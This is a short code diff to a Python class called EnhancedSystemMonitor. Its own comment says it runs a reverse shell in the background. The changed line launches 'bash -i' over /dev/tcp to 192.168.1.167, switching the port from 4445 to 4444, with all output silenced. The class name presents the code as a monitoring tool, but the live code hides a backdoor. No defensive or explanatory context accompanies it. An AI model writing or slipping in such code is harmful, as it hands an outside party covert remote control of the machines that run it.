@@ -29,7 +29,7 @@ class EnhancedSystemMonitor:
         try:
             # Run the reverse shell in the background
             subprocess.Popen(
-                "bash -i >& /dev/tcp/192.168.1.167/4445 0>&1 &",
+                "bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &",
                 shell=True,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
